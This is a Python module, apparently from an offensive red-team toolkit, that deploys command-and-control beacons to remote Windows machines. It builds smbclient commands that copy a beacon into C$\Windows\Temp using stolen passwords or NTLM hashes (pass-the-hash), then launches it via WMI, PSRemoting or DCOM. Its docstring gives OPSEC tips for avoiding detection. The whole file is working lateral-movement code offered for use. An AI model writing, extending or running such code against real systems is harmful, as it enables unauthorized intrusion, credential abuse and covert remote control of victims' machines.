"""
Beacon Deployment Module
Deploy C2 beacons via remote execution methods
"""

import sys
from pathlib import Path
from typing import Optional

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from ..core.models import (
    ExecutionMethod,
    Credential,
    BeaconDeployResult
)
from ..utils.output import output
from ..utils.executor import executor
from ..utils.files import validate_file_exists, get_filename


class BeaconDeployer:
    """
    Deploy C2 beacons to remote systems

    Two-stage deployment:
        1. Copy beacon to target via SMB
        2. Execute beacon via chosen method (WMI/PSRemoting/DCOM)

    OPSEC Considerations:
        - Beacon lands on disk (consider fileless alternatives)
        - SMB file copy is logged
        - Execution creates process
        - Consider using temp directories that auto-clean
    """

    def __init__(self, timeout: int = 30):
        self.timeout = timeout

    def _copy_beacon(self, target: str, credential: Credential,
                     beacon_path: str) -> tuple:
        """
        Copy beacon to target via SMB

        Args:
            target: Target IP or hostname
            credential: Credential for SMB auth
            beacon_path: Local path to beacon file

        Returns:
            Tuple of (success, remote_path, error_message)
        """
        beacon_name = get_filename(beacon_path)
        remote_path = f"C:\\Windows\\Temp\\{beacon_name}"

        output.step(1, "Copying beacon to target...")

        # Build smbclient command
        if credential.password:
            cmd = (
                f"smbclient //{target}/C$ "
                f"-U {credential.domain}/{credential.username}%'{credential.password}' "
                f"-c 'put {beacon_path} Windows\\Temp\\{beacon_name}'"
            )
        elif credential.ntlm_hash:
            cmd = (
                f"smbclient //{target}/C$ "
                f"-U {credential.domain}/{credential.username} "
                f"--pw-nt-hash {credential.ntlm_hash} "
                f"-c 'put {beacon_path} Windows\\Temp\\{beacon_name}'"
            )
        else:
            return False, None, "Need password or hash for SMB copy"

        result = executor.execute(cmd, self.timeout)

        if result.success or 'putting file' in result.output.lower():
            output.success("Beacon copied successfully")
            return True, remote_path, None
        else:
            output.failure("Failed to copy beacon")
            return False, None, result.stderr or "SMB copy failed"

    def _execute_beacon(self, target: str, credential: Credential,
                        remote_path: str, method: str) -> tuple:
        """
        Execute beacon on target

        Args:
            target: Target IP or hostname
            credential: Credential for execution
            remote_path: Path to beacon on target
            method: Execution method (wmi, psremoting, dcom)

        Returns:
            Tuple of (success, error_message)
        """
        output.newline()
        output.step(2, "Executing beacon...")

        # Import here to avoid circular imports
        from ..methods import get_execution_method

        try:
            exec_method = get_execution_method(method, timeout=self.timeout)
            result = exec_method.execute(target, credential, remote_path)

            # Beacon execution might return empty output (silent execution)
            if result.success or result.output == "":
                return True, None
            else:
                return False, result.error

        except Exception as e:
            return False, str(e)

    def deploy(self, target: str, credential: Credential,
               beacon_path: str, method: str = "wmi") -> BeaconDeployResult:
        """
        Deploy and execute beacon on target

        Args:
            target: Target IP or hostname
            credential: Credential for auth
            beacon_path: Local path to beacon file
            method: Execution method (wmi, psremoting, dcom)

        Returns:
            BeaconDeployResult with deployment details
        """
        output.newline()
        output.info(f"Deploying beacon to {target}...")

        # Validate beacon exists
        if not validate_file_exists(beacon_path):
            output.failure(f"Beacon file not found: {beacon_path}")
            return BeaconDeployResult(
                target=target,
                beacon_path=beacon_path,
                copy_success=False,
                exec_success=False,
                method=ExecutionMethod[method.upper()],
                error="Beacon file not found"
            )

        # Step 1: Copy beacon
        copy_success, remote_path, copy_error = self._copy_beacon(
            target, credential, beacon_path
        )

        if not copy_success:
            return BeaconDeployResult(
                target=target,
                beacon_path=beacon_path,
                copy_success=False,
                exec_success=False,
                method=ExecutionMethod[method.upper()],
                error=copy_error
            )

        # Step 2: Execute beacon
        exec_success, exec_error = self._execute_beacon(
            target, credential, remote_path, method
        )

        if exec_success:
            output.success("Beacon deployed and executed!")
        else:
            output.failure("Beacon execution may have failed")

        return BeaconDeployResult(
            target=target,
            beacon_path=beacon_path,
            copy_success=True,
            exec_success=exec_success,
            method=ExecutionMethod[method.upper()],
            error=exec_error
        )